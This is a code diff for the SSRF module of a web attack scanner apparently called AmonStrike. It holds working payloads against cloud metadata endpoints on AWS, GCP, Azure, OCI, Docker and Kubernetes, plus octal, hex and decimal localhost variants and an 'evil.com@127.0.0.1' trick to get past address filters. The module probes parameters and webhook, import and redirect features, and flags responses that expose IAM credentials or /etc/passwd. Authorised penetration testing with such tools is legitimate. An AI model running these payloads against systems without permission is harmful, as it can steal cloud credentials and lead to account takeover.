@@ -1,71 +1,171 @@
-"""AmonStrike — SSRF Module"""
-from urllib.parse import parse_qs, urlparse
+"""
+AmonStrike — SSRF Module
+Server-Side Request Forgery — gateway to cloud credential theft.
+"""
+import re
+import uuid
 from .base import BaseModule
+try:
+    from core.interactsh import OOBDetector
+    _HAS_OOB = True
+except Exception:
+    _HAS_OOB = False
+
+CLOUD_METADATA = {
+    "AWS":   "http://169.254.169.254/latest/meta-data/",
+    "GCP":   "http://metadata.google.internal/computeMetadata/v1/",
+    "Azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "OCI":   "http://169.254.169.254/opc/v1/instance/",
+    "Docker":"http://172.17.0.1/",
+    "K8s":   "http://kubernetes.default.svc/",
+}
+
+BYPASS_VARIANTS = [
+    "http://127.0.0.1/",
+    "http://localhost/",
+    "http://[::1]/",
+    "http://0.0.0.0/",
+    "http://0177.0.0.01/",        # Octal IP
+    "http://2130706433/",          # Decimal IP for 127.0.0.1
+    "http://127.1/",
+    "http://127.000.000.001/",
+    "http://0x7f000001/",          # Hex IP
+    "http://127.0.0.1:80/",
+    "http://127.0.0.1%23@evil.com/",
+    "http://evil.com@127.0.0.1/",
+]
+
+SSRF_PARAMS = [
+    "url","redirect","next","return","callback","webhook",
+    "dest","destination","uri","link","src","source","goto",
+    "image","img","path","fetch","load","endpoint","proxy",
+    "target","site","out","feed","data","host","to","ref",
+]
+
+SSRF_SIGNATURES = [
+    "ami-id", "instance-id", "AccessKeyId", "iam/security-credentials",
+    "computeMetadata", "metadata/instance", "local-ipv4",
+    "root:x", "daemon:", "DOCUMENT_ROOT", "SSH_CLIENT",
+]
+
 
 class SsrfModule(BaseModule):
-    NAME = "ssrf"
-    DESCRIPTION = "Server-Side Request Forgery — internal network access"
-
-    SSRF_PAYLOADS = [
-        "http://127.0.0.1/",
-        "http://localhost/",
-        "http://[::1]/",
-        "http://0.0.0.0/",
-        "http://169.254.169.254/",  # AWS metadata
-        "http://169.254.169.254/latest/meta-data/",
-        "http://metadata.google.internal/",
-        "http://192.168.0.1/",
-        "http://10.0.0.1/",
-        "http://172.16.0.1/",
-        "file:///etc/passwd",
-        "dict://127.0.0.1:6379/",
-        "gopher://127.0.0.1:6379/_INFO",
-    ]
-
-    SSRF_INDICATORS = [
-        "root:x:0:0",                    # LFI via file://
-        "ami-id",                         # AWS metadata
-        "instance-id",                    # Cloud metadata
-        "computeMetadata",               # GCP metadata
-        "iam/security-credentials",      # AWS IAM
-    ]
+    NAME        = "ssrf"
+    DESCRIPTION = "SSRF — cloud metadata, OOB, bypass variants, redirect chains"
 
     def run(self):
-        self.log("Testing for SSRF vulnerabilities...")
-        parsed = urlparse(self.url)
-        params = parse_qs(parsed.query)
+        self.log("Testing SSRF...")
 
-        url_params = {k: v[0] for k, v in params.items()
-                     if any(s in k.lower() for s in ["url", "uri", "href", "src", "redirect", "fetch", "load", "link", "callback", "return"])}
+        # Setup OOB for blind SSRF
+        oob = None
+        if _HAS_OOB:
+            try:
+                oob = OOBDetector()
+                self.info["oob_url"] = oob.url
+            except Exception:
+                pass
 
-        if not url_params:
-            url_params = {"url": "http://example.com", "redirect": "/home"}
+        # Test all SSRF parameters
+        self._test_url_params()
 
-        for param, orig in url_params.items():
-            for payload in self.SSRF_PAYLOADS[:8]:
-                resp = self.get(params={param: payload})
-                if resp:
-                    if any(ind in resp.text for ind in self.SSRF_INDICATORS):
-                        self.add_finding(
-                            title=f"SSRF — Internal Resource Access via {param}",
-                            severity="CRITICAL",
-                            description=f"SSRF in parameter '{param}'. Server is fetching internal resources on behalf of the attacker. Cloud metadata or internal services may be accessible.",
-                            evidence=f"Parameter: {param}\nPayload: {payload}\nResponse contains internal content",
-                            remediation="Validate URLs against an allowlist of permitted domains. Block internal IP ranges. Use DNS rebinding protection.",
-                            url=resp.url,
-                            cve="CWE-918"
-                        )
-                        break
-                    elif resp.status_code == 200 and "169.254.169.254" in payload:
-                        self.add_finding(
-                            title=f"Potential SSRF — Cloud Metadata Endpoint Reached",
-                            severity="HIGH",
-                            description=f"Request to AWS metadata endpoint returned 200. Confirm manually.",
-                            evidence=f"GET {self.url}?{param}={payload} → 200",
-                            remediation="Block IMDS access. Use IMDSv2 on AWS. Implement SSRF protection.",
-                            url=self.url,
-                            cve="CWE-918"
-                        )
+        # Test webhook/import features
+        self._test_functional_ssrf()
 
-        self.log(f"SSRF scan complete — {len(self.findings)} findings", "+")
+        # Test redirect-based SSRF
+        self._test_redirect_ssrf()
+
+        self.log(f"SSRF complete — {len(self.findings)} findings", "+")
         return self.result()
+
+    def _test_url_params(self):
+        """Test query parameters that take URLs."""
+        for param in SSRF_PARAMS:
+            # Test cloud metadata directly
+            for cloud, meta_url in CLOUD_METADATA.items():
+                r = self.get(params={param: meta_url})
+                if r and any(sig in r.text for sig in SSRF_SIGNATURES):
+                    self._report_ssrf(param, meta_url, r, cloud)
+                    return
+
+            # Test internal bypass variants
+            for bypass in BYPASS_VARIANTS[:5]:
+                r = self.get(params={param: bypass})
+                if r and r.status_code == 200:
+                    if any(sig in r.text for sig in
+                           ["root:x","daemon","uid=","HOME="]):
+                        self._report_ssrf(param, bypass, r, "Internal")
+                        return
+
+    def _test_functional_ssrf(self):
+        """Test features designed to fetch URLs (PDF gen, image import, etc.)."""
+        ssrf_endpoints = [
+            ("/api/webhook", "url"),
+            ("/api/fetch",   "url"),
+            ("/api/import",  "url"),
+            ("/api/export",  "url"),
+            ("/api/preview", "url"),
+            ("/screenshot",  "url"),
+            ("/pdf",         "url"),
+            ("/render",      "url"),
+        ]
+        for path, param in ssrf_endpoints:
+            r = self.get(path)
+            if not r or r.status_code == 404:
+                continue
+            for cloud, meta_url in CLOUD_METADATA.items():
+                r2 = self.post(path, json={param: meta_url})
+                if not r2:
+                    r2 = self.get(path, params={param: meta_url})
+                if r2 and any(sig in r2.text for sig in SSRF_SIGNATURES):
+                    self._report_ssrf(param, meta_url, r2, cloud)
+                    return
+
+    def _test_redirect_ssrf(self):
+        """Test open redirects that can be chained for SSRF."""
+        redirect_params = ["redirect","next","return","goto","url","location"]
+        for param in redirect_params:
+            for meta_url in list(CLOUD_METADATA.values())[:2]:
+                r = self.get(params={param: meta_url}, allow_redirects=True)
+                if r and any(sig in r.text for sig in SSRF_SIGNATURES):
+                    self._report_ssrf(param, meta_url, r, "Redirect Chain")
+
+    def _report_ssrf(self, param: str, payload: str, r, cloud: str):
+        # Identify what was exposed
+        exposed = []
+        if "AccessKeyId" in r.text:
+            exposed.append("AWS IAM credentials")
+        if "ami-id" in r.text or "instance-id" in r.text:
+            exposed.append("AWS instance metadata")
+        if "computeMetadata" in r.text:
+            exposed.append("GCP metadata")
+        if not exposed:
+            exposed = ["internal server response"]
+
+        self.add_finding(
+            title       = f"SSRF — {cloud} Cloud Metadata Exposed via '{param}'",
+            severity    = "CRITICAL",
+            description = (
+                f"Server-Side Request Forgery via '{param}' parameter reaches "
+                f"{cloud} cloud metadata service. "
+                f"Exposed: {', '.join(exposed)}. "
+                f"Can escalate to full cloud account takeover."
+            ),
+            evidence    = (
+                f"Parameter: {param}\nPayload: {payload}\n"
+                f"Cloud: {cloud}\nExposed data: {', '.join(exposed)}\n"
+                f"Response: {r.text[:400]}"
+            ),
+            remediation = (
+                "Block requests to 169.254.169.254 at network level. "
+                "Validate and whitelist allowed URL schemes/hosts. "
+                "Enable IMDSv2 on all EC2 instances. "
+                "Never allow user-controlled URLs in server-side HTTP calls."
+            ),
+            url         = self.url,
+            parameter   = param,
+            payload     = payload,
+            cve         = "CWE-918",
+        )
+        self.info["ssrf_param"]   = param
+        self.info["ssrf_payload"] = payload
+        self.info["ssrf_cloud"]   = cloud
